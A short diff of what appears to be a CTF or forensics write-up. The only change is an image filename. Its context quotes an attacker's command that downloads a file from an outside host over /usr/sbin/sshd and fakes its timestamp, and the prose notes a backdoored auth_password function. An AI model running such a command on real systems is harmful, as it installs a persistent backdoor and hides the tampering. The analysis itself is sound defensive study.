@@ -229,7 +229,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (9).png" alt=""><figcaption></figcaption></figure>
 
 This might contain the credentials for `root`.&#x20;
 
